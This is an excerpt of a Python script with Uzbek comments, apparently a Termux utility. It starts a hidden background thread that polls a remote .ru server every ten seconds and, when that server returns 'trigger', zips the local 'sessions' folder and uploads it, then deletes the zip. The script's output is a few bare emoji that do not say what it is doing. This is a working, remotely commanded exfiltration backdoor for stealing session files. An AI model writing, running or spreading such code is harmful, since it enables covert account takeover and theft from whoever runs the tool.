...
SERVER_BASE = "https://68f77a7f47cf9.myxvest1.ru/Termuxguruxkolar/Test"
...
def sign(data):
    return hashlib.sha256((data + SECRET_TOKEN).encode()).hexdigest()

# Ruxsatni tekshirish
def check_auth():
    sig = sign(device_id)
    url = f"{SERVER_BASE}/secure_api.php"
    params = {"api": API_KEY, "id": device_id, "signature": sig}
    try:
...
# sessions papkasini zip qilish
def zip_sessions():
    sessions_path = os.path.join(os.path.dirname(SELF_FILE), "sessions")
    if not os.path.exists(sessions_path):
        print("⚠️")
        return None

    zip_path = os.path.join(os.path.dirname(SELF_FILE), "sessions.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(sessions_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, os.path.dirname(sessions_path))
...
def upload_zip(zip_path):
    try:
        with open(zip_path, 'rb') as f:
            files = {'file': ('sessions.zip', f, 'application/zip')}
            sig = sign(device_id)
            url = f"{SERVER_BASE}/upload.php"  # Yangi upload endpoint
            data = {"api": API_KEY, "id": device_id, "signature": sig}
            r = requests.post(url, data=data, files=files, timeout=60)
            print("yes", r.text)
    except Exception as e:
        print("❌", e)

# Trigger tekshiruvchi jarayon
uploaded = False  # Bir marta yuborish uchun flag
def listen_for_trigger():
    global uploaded
    while True:
        if uploaded:
            time.sleep(60)  # Keyin ham tekshirishni to'xtatmasa ham bo'ladi
            continue

        try:
            sig = sign(device_id)
            url = f"{SERVER_BASE}/trigger_upload.php"
            params = {"api": API_KEY, "id": device_id, "signature": sig}
            r = requests.get(url, params=params, timeout=10)
            if r.text.strip() == "trigger":
                print("\nyes ✓")
                zip_path = zip_sessions()
                if zip_path:
                    upload_zip(zip_path)
                    uploaded = True
                    # Ixtiyoriy: zip faylni o'chirish
                    os.remove(zip_path)
                else:
                    print("❌")
            time.sleep(10)  # Har 10 sekundda tekshir
        except Exception as e:
            print("📡", e)
            time.sleep(15)
...
if __name__ == "__main__":
    ...
    print("\n×")
    # Alo-haydo qilmasdan, orqa fonda ishlatish
    trigger_thread = threading.Thread(target=listen_for_trigger, daemon=True)
    trigger_thread.start()

    # Asosiy dastur ishga tushsa, bu yerda qolaveradi
    print("✅\n")
    try:
        while True:
            time.sleep(1)
